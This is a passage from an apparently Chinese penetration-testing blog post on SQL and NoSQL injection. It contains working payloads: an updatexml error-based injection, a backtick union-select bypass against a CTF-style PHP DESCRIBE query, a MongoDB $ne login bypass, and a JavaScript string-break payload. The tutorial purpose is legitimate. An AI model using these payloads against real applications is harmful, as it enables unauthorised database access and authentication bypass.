+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">delete</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">21</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">database</span><span class="p">()),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h3 id="135-descibe-注入">13.5 DESCIBE 注入</h3>
+<blockquote>
+<p>{DESCRIBE | DESC} table_name [col_name | wild]</p>
+<p>DESCRIBE 提供有关一个表的列信息。col_name 可以是一个列名或是一个包含 SQL 通配符字符 <code>%</code>和 <code>_</code> 的字符串。</p>
+</blockquote>
+<p>源代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">require</span><span class="p">(</span><span class="s2">&#34;config.php&#34;</span><span class="p">);</span>
+<span class="nv">$table</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span><span class="o">?</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span><span class="o">:</span><span class="s2">&#34;test&#34;</span><span class="p">;</span>
+<span class="nv">$table</span> <span class="o">=</span> <span class="nx">Filter</span><span class="p">(</span><span class="nv">$table</span><span class="p">);</span>
+<span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$mysqli</span><span class="p">,</span><span class="s2">&#34;desc `secret_</span><span class="si">{</span><span class="nv">$table</span><span class="si">}</span><span class="s2">`&#34;</span><span class="p">)</span> <span class="k">or</span> <span class="nx">Hacker</span><span class="p">();</span>
+<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select &#39;flag{xxx}&#39; from secret_</span><span class="si">{</span><span class="nv">$table</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span>
+<span class="nv">$ret</span> <span class="o">=</span> <span class="nx">sql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$ret</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>desc 可以接受两个参数，可以过掉第一个检测。</p>
+<p>反引号在 union select 中可以当做空格。</p>
+<p>payload:</p>
+<p>?table=test`` union select database() limit 1 offset 1</p>
+<h2 id="14-nosql-注入">14 NoSQL 注入</h2>
+<h3 id="141-定义">14.1 定义</h3>
+<p>泛指非关系型的数据库。随着互联网 web2.0 网站的兴起，在高可用，高并发压力下，传统数据库已经不能满足需求，用于解决大数据应用和超大规模数据存储的问题。</p>
+<p>主要代表：MongDB、 Redis、 Memcache</p>
+<p>以 MongDB 为例，它是一个面向文档存储的数据库，以键值对形式存在</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
+  <span class="err">name:</span> <span class="nt">&#34;Geekby&#34;</span><span class="p">,</span>
+  <span class="err">age:</span> <span class="err">26,</span>
+  <span class="err">status:</span> <span class="nt">&#34;A&#34;</span><span class="p">,</span>
+  <span class="err">groups:</span> <span class="err">[</span><span class="nt">&#34;news&#34;</span><span class="p">,</span> <span class="nt">&#34;sports&#34;</span><span class="err">]</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="142-注入原理一">14.2 注入原理一</h3>
+<ol>
+<li>基本语法</li>
+</ol>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108091831.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108091831.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108091831.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108091831.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108091831.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108091831.png-water_print" /></p>
+<ol start="2">
+<li>注入过程</li>
+</ol>
+<p>以用户身份验证为例，POST 请求：</p>
+<p><code>username=test&amp;password=123456</code></p>
+<p>后端程序语言，我们希望是这样的：</p>
+<p><code>db.users.find({username: 'test', password: '123456'})</code></p>
+<p>因此，我们可以构造如下请求：</p>
+<p><code>username[$ne]=1&amp;password[$ne]=1</code></p>
+<p>实际后端程序运行：</p>
+<p><code>db.logins.find({username:{$ne:1}, password:{$ne:1}})</code></p>
+<p>类比传统 SQL 语句：</p>
+<p><code>select * from logins where username &lt;&gt; 1 and password &lt;&gt; 1</code></p>
+<h3 id="143-注入原理二">14.3 注入原理二</h3>
+<p>如果在编程语言中不够谨慎，也可能产生像 sqli 注入那样的截断问题，但是这是在程序语言中而非 SQL 语句中：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">$script</span><span class="o">=</span> <span class="s2">&#34;try{
+</span><span class="s2">	var key = db.users.find({username: &#39;test&#39;}).value;
+</span><span class="s2">	var inputValue = &#39;&#34;</span><span class="p">.</span><span class="nx">$input</span><span class="p">.</span><span class="s2">&#34;&#39;;
+</span><span class="s2">	if(key == inputValue) {
+</span><span class="s2">		return(&#39;match&#39;);
+</span><span class="s2">}}&#34;</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>当输入 <code>';return key;//</code> -&gt; <code>var inputValue='';return key;//'</code>，导致 inputValue 为空，直接返回 key 字段</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-01-02</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/" data-title="SQL注入相关"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/" data-title="SQL注入相关"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/" data-title="SQL注入相关"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E5%B8%B8%E7%94%A8/">常用</a>,&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/" class="prev" rel="prev" title="公有云安全"><i class="fas fa-angle-left fa-fw"></i>公有云安全</a>
+            <a href="/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/" class="next" rel="next" title="XSS 漏洞相关">XSS 漏洞相关<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
